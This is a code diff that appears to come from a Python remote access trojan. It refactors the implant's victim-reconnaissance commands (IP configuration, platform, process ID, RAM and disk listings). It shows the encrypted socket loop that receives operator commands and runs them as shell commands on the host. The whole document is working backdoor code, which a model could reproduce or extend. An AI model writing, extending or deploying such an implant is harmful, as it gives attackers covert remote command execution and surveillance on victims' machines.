@@ -4,6 +4,7 @@ import socket
 import sys
 import os
 import subprocess
+import psutil
 import platform
 import base64
 import hashlib
@@ -11,8 +12,6 @@ import random
 import string
 from Crypto import Random
 from Crypto.Cipher import AES
-#from Crypto.Util.Padding import pad
-#from Crypto.Util.Padding import unpad
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.backends import default_backend
@@ -60,20 +59,54 @@ class Commands:
     """
     This module gets info from the victim Operating System
     """
-    def ip():
+    def __init__(self, command):
+        self.msg = command
+
+    def get_info(self):
+        known_comm = ['sysinfo', 'ip', 'platform', 'pid', 'resources']
+        if self.msg[5:] == 'sysinfo':
+            return ' '.join(self.system())
+        elif self.msg[5:] == 'ip':
+            return self.ip()
+        elif self.msg[5:] == 'platform':
+            return self.platform()
+        elif self.msg[5:] == 'pid':
+            return self.pid()
+        elif self.msg[5:] == 'resources':
+            return self.resources()
+        else:
+            return 'List of available information gathering commands : info + [{}]'.format(' '.join(known_comm))
+
+    def ip(self):
         if platform.system() == 'Windows':
             return subprocess.check_output('ipconfig /all', shell=True).decode('cp850')
         else:
             return subprocess.check_output('ip addr show', shell=True).decode('UTF-8')
 
-    def system():
+    def system(self):
         return platform.uname()
 
-    def platform():
+    def platform(self):
         return platform.platform().replace('-', ' ')
 
-    def pid():
-        return "Process ID :", os.getpid()
+    def pid(self):
+        return 'Process ID : {}\n{}'.format(os.getpid(), psutil.test())
+
+    def resources(self):
+        ram = '\nRAM used : {}%\n'.format(psutil.virtual_memory().percent)
+        diskarray = []
+        for disks in psutil.disk_partitions():
+            temp = []
+            for i in range(len(disks)):
+                temp.append(disks._fields[i] + ':')
+                temp.append(disks[i] + '  ')
+            diskarray.append(temp)
+            array = ''
+        for disks in diskarray:
+            array += '\t' + ' '.join(disks) + '\n'
+        disks = 'Disks : \n{}'.format(array)
+
+        return ram + disks
 
 
 class InThread(threading.Thread):
@@ -102,8 +135,8 @@ class InThread(threading.Thread):
 
     def run(self):
         conn, in_ip = self.socket.accept()
-        print('connection received')
         self.init_public_key(conn)
+        # Creating OutThread when incoming connection is received
         cons = OutThread(in_ip, self.out_port)
         remote_aeskey = self.rsa_decrypt(conn.recv(1024)).decode('UTF-8')
         aes = AESCipher(remote_aeskey)
@@ -111,7 +144,6 @@ class InThread(threading.Thread):
         again = True
         while again:
             msg = aes.decrypt(conn.recv(1024))
-            #msg = self.rsa_decrypt(conn.recv(1024)).decode('UTF-8')
             print(msg)
             if msg == 'exit':
                 again = False
@@ -120,7 +152,6 @@ class InThread(threading.Thread):
                 comm_again = True
                 while comm_again:
                     command = aes.decrypt(conn.recv(1024))
-                    #command = self.rsa_decrypt(conn.recv(1024)).decode('UTF-8')
                     print(command)
                     if command == '':
                         pass
@@ -137,18 +168,8 @@ class InThread(threading.Thread):
                         except subprocess.CalledProcessError:
                             cons.send("Impossible d'exécuter cette commande")
             elif msg[:4] == 'info':
-                known_comm = ['sysinfo', 'ip', 'platform', 'pid']
-                if msg[5:] == 'sysinfo':
-                    resp = ' '.join(Commands.system())
-                elif msg[5:] == 'ip':
-                    resp = Commands.ip()
-                elif msg[5:] == 'platform':
-                    resp = Commands.platform()
-                elif msg[5:] == 'pid':
-                    resp = Commands.pid()
-                else:
-                    resp = ('List of available information gathering commands : info + [{}]'.format(known_comm))
-                cons.send(str(resp))
+                x = Commands(msg)
+                cons.send(str(x.get_info()))
         cons.stop()
         time.sleep(2)
         #self.socket.shutdown(socket.SHUT_RDWR)
